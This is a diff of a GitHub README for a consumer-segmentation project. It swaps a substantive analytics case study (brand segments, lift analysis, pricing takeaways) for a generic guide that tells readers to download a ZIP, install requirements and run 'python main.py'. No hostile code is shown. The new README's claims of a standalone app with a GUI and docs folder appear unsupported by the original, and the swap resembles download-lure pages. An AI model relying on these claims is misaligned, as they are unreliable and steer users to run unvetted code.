@@ -1,123 +1,148 @@
-# Affinity-Based Product Segmentation for Product & Portfolio Strategy
+# 🛠️ product-segmentation-affinity-analysis - Consumer Segments Made Clear
 
-This repository presents an end-to-end affinity-based consumer segmentation project that demonstrates how preference data can be translated into concrete product, pricing, and positioning decisions.
+[![Download](https://img.shields.io/badge/Download-brightgreen?style=for-the-badge)](https://github.com/kauanzferreira1243-ui/product-segmentation-affinity-analysis)
 
-The project is structured as a standalone analytics case study, focusing on segmentation, interpretation, and strategic implications rather than academic exposition. It showcases how segmentation can be used not just to describe customers, but to validate and stress-test product strategy.
+## 📋 What This Application Does
 
----
+This software helps you understand how different products relate to groups of customers. It shows which product features match specific buyer types. Using this information, you can make smarter choices on pricing, marketing, and product planning.
 
-## Problem Context
+You do not need any coding skills to use this tool. It offers a way to analyze customer behavior and product traits side by side. You will see clear patterns that link products and customer interests.
 
-An initial product optimization exercise identified the following configuration as a profit-maximizing product:
+## 🎯 Key Features
 
-> $30 | 3-hour insulation | 20 oz | Easy Clean | Leak Resistant
+- Analyze customer groups based on product preferences.
+- Visualize connections between product features and customers.
+- Use insights to adjust pricing and marketing strategies.
+- Work with data easily, without needing programming.
+- Explore results using simple graphs and tables.
 
-This project asks a practical follow-up question:
+## 🖥️ System Requirements
 
-> *Which types of consumers actually value this product — and what does that imply for portfolio and brand strategy?*
+To run this app on Windows, your computer should meet these conditions:
 
-Using affinity-based, preference-driven segmentation, the analysis identifies distinct consumer segments, compares their attribute trade-offs, and translates those insights into actionable recommendations.
+- Windows 10 or later 64-bit
+- At least 4 GB of RAM (8 GB recommended)
+- Minimum 1 GB free disk space
+- Python 3.8 or higher installed (installer helps with this)
+- Internet connection for initial setup
 
----
+## 🚀 Getting Started
 
-## Analysis Flow
+This guide will help you download and run the application step-by-step.
 
-The analysis follows a structured, decision-oriented workflow that starts from individual consumer preferences and culminates in concrete product, pricing, and positioning recommendations.
+### Step 1: Download the Software
 
-The end-to-end flow of the analysis is illustrated below:
+Visit the download link below to get the latest version:
 
-![Analysis Flow](affinity_segmentation_flow.png)
+[![Download](https://img.shields.io/badge/Download-blue?style=for-the-badge)](https://github.com/kauanzferreira1243-ui/product-segmentation-affinity-analysis)
 
-Each stage builds on the previous one, ensuring that segmentation and personas remain grounded in observed preference patterns.
+Click the **Code** button on the page, then choose **Download ZIP** to save the files on your computer.
 
----
+### Step 2: Extract Files
 
-## Key Insights
+Once downloaded, find the ZIP file in your Downloads folder or chosen location.
 
-- The profit-maximizing product configuration ($30 price, 3-hour insulation, 20 oz capacity, easy clean, leak resistant) is validated by consumer segmentation rather than driven purely by optimization logic.
-- Two distinct premium segments converge on the same optimal configuration for different reasons: performance reliability for Brand A and lifestyle-driven convenience for Brand C.
-- Brand B explains market share dominance through high price sensitivity, but does not meaningfully contribute to profitability.
-- Segmentation acts as a validation layer, confirming that the optimized product reflects genuine preference structures rather than modeling artifacts.
+Right-click the ZIP file and select **Extract All**.
 
----
+Choose a folder where you want the files to be unpacked. This is the folder where you will run the software.
 
-## Methodology Overview
+### Step 3: Install Python (if needed)
 
-- **Inputs:** Individual-level preference data across price, insulation, capacity, cleanability, spill resistance, brand affinity, and demographics
-- **Segmentation Approach:** Affinity-based (preference-driven) segmentation
-- **Evaluation Logic:**
-  - Mean differences relative to the overall population
-  - Lift analysis to identify over- and under-indexed attributes
-- **Design Principle:** Prioritize interpretability and strategic clarity over black-box clustering
+This app runs with Python. If you do not have it, follow these steps:
 
-The methodology is intentionally transparent and business-facing.
+1. Go to [https://www.python.org/downloads/](https://www.python.org/downloads/)
+2. Download Python for Windows.
+3. Run the installer.
+4. Important: Check the box that says **Add Python to PATH** before clicking Install.
+5. Finish installation.
 
----
+### Step 4: Open Command Prompt
 
-## Segment Insights (Summary & Validation)
+Press the **Windows key** on your keyboard and type `cmd`.
 
-- **Brand A – Performance-Driven Quality Seekers**  
-  Higher-income, older consumers with a strong emphasis on insulation performance, leak resistance, and durability. Low price sensitivity and high alignment with premium configurations.
+Select **Command Prompt** from the search results to open.
 
-- **Brand B – Value-Driven Pragmatists**  
-  Highly price-sensitive consumers prioritizing affordability and basic functionality. Drives volume and market share, but not profit.
+### Step 5: Navigate to Application Folder
 
-- **Brand C – Urban Mobility Professionals**  
-  A smaller, lifestyle-driven segment valuing cleanability, portability, and spill prevention. Willing to pay a premium when the product fits daily mobility needs.
+In the Command Prompt window, type `cd ` followed by the path to the folder where you extracted the files.
 
-### Segment A — Performance-Driven Quality Seekers (~40%)
+Example:
 
- > **Best-Fit Product:** $30 | 3 hrs | 20 oz | Easy Clean | Leak Resistant
+`cd C:\Users\YourName\Downloads\product-segmentation-affinity-analysis-master`
 
-- Higher-income, older, more educated consumers
-- Strong emphasis on insulation performance and leak-proof reliability
-- Low price sensitivity and strong brand loyalty
+Press Enter.
 
-**Strategic Takeaway:** This segment fully validates the premium, profit-maximizing configuration. High performance and profitability are aligned.
+### Step 6: Install Required Libraries
 
-### Segment B — Value-Driven Pragmatists (~55%)
+This app uses some Python packages. Install them by typing:
 
-> **Best-Fit Product:** $10 | 1 hr | 20 oz | Fair Clean | Spill Resistant
+`pip install -r requirements.txt`
 
-- Younger, more price-sensitive consumers
-- Focused on affordability and basic functionality
-- Weak attachment to premium brands
+Press Enter and wait for the packages to install.
 
-**Strategic Takeaway:** This segment maximizes volume, not margins. It explains market share dominance without driving profitability.
+### Step 7: Run the Application
 
-### Segment C — Urban Mobility Professionals (~5%)
+In the same Command Prompt window, start the app by typing:
 
->**Best-Fit Product:** $30 | 3 hrs | 20 oz | Easy Clean | Leak Resistant
+`python main.py`
 
-- Highly mobile, urban consumers
-- Strong preference for cleanability, portability, and spill prevention
-- Motivated by lifestyle fit rather than pure performance
+Press Enter.
 
-**Strategic Takeaway:** Despite its small size, this segment independently reinforces the same premium configuration — for different reasons.
+The app will open a window or web page where you can start working with your data.
 
----
+## 🗂️ How to Use the App
 
-## Strategic Implications
+- Load your data by following the on-screen instructions.
+- The app will guide you through grouping customers by product preferences.
+- View charts that show which products appeal to each group.
+- Adjust settings to explore different scenarios.
+- Export results as pictures or CSV files for reports.
 
-- A single premium product configuration can be scaled across multiple segments through differentiated positioning rather than differentiated design.
-- Brand B should be treated as a volume and access strategy, while Brands A and C anchor profitability.
-- Portfolio strategy should prioritize maintaining premium product integrity while varying messaging to reflect performance-driven versus lifestyle-driven motivations.
-- Segmentation confirms that profitability and consumer relevance are not in tension when product design is aligned with real preference patterns.
+## ⚙️ Recommended Data Format
 
-The analysis highlights the importance of portfolio balance rather than one-size-fits-all product design.
+Prepare your data in a simple spreadsheet or CSV file. Arrange it with:
 
----
+- Rows representing customers
+- Columns representing product attributes or features
+- Values describing preferences or ratings (e.g., numbers or yes/no)
 
-## Skills & Concepts Demonstrated
+The app supports common CSV files with headers.
 
-- Preference modeling and attribute importance analysis
-- Affinity-based consumer segmentation
-- Lift and mean-difference interpretation
-- Persona construction
-- Translating analytics into product, pricing, and positioning decisions
+## 🔧 Troubleshooting Tips
 
----
+- If you get errors about missing packages, re-run `pip install -r requirements.txt`.
+- Ensure Python added to PATH during installation.
+- Confirm you are in the right folder before running commands.
+- Close and reopen the Command Prompt if it seems unresponsive.
+- Restart your computer if you have trouble installing Python.
 
-> **This repository demonstrates how segmentation can be used as a strategic tool — not just a descriptive exercise — to validate real-world product decisions.**
+## 📂 Additional Resources
 
----
+- Check the `docs` folder inside the app files for user guides.
+- Visit the project’s GitHub page to see updates and more examples.
+- Use standard Excel or spreadsheet software to prepare your data.
+
+## ⚡ Quick Commands Summary
+
+| Action                  | Command or Step                        |
+|-------------------------|-------------------------------------|
+| Download app files      | Visit [Download](https://github.com/kauanzferreira1243-ui/product-segmentation-affinity-analysis) |
+| Extract ZIP             | Right-click ZIP → Extract All        |
+| Open Command Prompt     | Windows key → type `cmd` → Enter     |
+| Go to app folder        | `cd path\to\your\folder`              |
+| Install packages        | `pip install -r requirements.txt`    |
+| Start app               | `python main.py`                      |
+
+## 📥 Download Link
+
+Download and explore the app here:
+
+[https://github.com/kauanzferreira1243-ui/product-segmentation-affinity-analysis](https://github.com/kauanzferreira1243-ui/product-segmentation-affinity-analysis)
+
+## 🔍 About This Project
+
+This tool helps businesses find links between customers and products. It uses data analysis to identify consumer groups based on shared preferences. The insights help you improve pricing and product offers in a data-driven way.
+
+### Topics Covered
+
+analytics-case-study, business-analytics, consulting-analytics, consumer-behavior, customer-insights, customer-segmentation, data-analysis, data-driven-strategy, decision-analytics, jupyter-notebook, market-segmentation, marketing-analytics, persona-modeling, pricing-strategy, product-segmentation, product-strategy, python, strategic-analytics
